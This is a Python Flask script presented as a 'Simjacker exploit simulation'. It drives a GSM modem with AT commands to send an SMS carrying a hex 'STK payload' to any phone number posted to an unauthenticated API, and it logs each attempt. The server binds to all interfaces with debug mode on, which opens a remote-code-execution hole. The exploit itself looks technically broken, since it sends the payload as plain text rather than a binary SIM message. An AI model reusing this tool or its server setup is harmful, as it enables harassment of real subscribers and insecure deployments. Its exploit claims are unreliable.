import serial
import time
import logging
from flask import Flask, request, jsonify

# -------------------------------------------
# 📡 Simjacker Exploit Simulation (For Research Purposes Only)
# -------------------------------------------
# ✅ Simulates sending a Simjacker attack via SMS (STK-based)
# ✅ Logs device responses & interactions
# ✅ Can be used to test Simjacker detection systems
# -------------------------------------------

app = Flask(__name__)
logging.basicConfig(filename="simjacker_logs.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

# Serial Port Configuration for Modem (Change as needed)
SERIAL_PORT = "/dev/ttyUSB0"  # Change to match your GSM modem
BAUD_RATE = 115200

def send_simjacker_sms(target_number, payload):
    """Sends a simulated Simjacker attack via SMS."""
    try:
        modem = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=1)
        time.sleep(2)

        # Send AT Command to set SMS mode
        modem.write(b'AT+CMGF=1\r')  # Set to text mode
        time.sleep(1)

        # Send SMS command
        modem.write(f'AT+CMGS="{target_number}"\r'.encode())
        time.sleep(1)

        # Send Simjacker Payload (STK Command)
        modem.write(payload.encode() + b'\x1A')  # Ctrl+Z to send SMS
        time.sleep(2)

        logging.info(f"Simjacker SMS sent to {target_number}")
        return f"Simjacker SMS sent to {target_number}"
    except Exception as e:
        logging.error(f"Error sending Simjacker SMS: {str(e)}")
        return f"Error: {str(e)}"

@app.route('/send_simjacker', methods=['POST'])
def send_attack():
    """API to trigger Simjacker attack simulation."""
    data = request.json
    target_number = data.get("target_number")
    payload = data.get("payload", "D0C60B9000410000000101")  # Example STK payload

    if not target_number:
        return jsonify({"status": "error", "message": "Target number required"})

    result = send_simjacker_sms(target_number, payload)
    return jsonify({"status": "success", "message": result})

@app.route('/logs', methods=['GET'])
def get_logs():
    """Fetches the Simjacker attack logs."""
    with open("simjacker_logs.txt", "r") as log_file:
        logs = log_file.readlines()
    return jsonify({"logs": logs})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5004, debug=True)
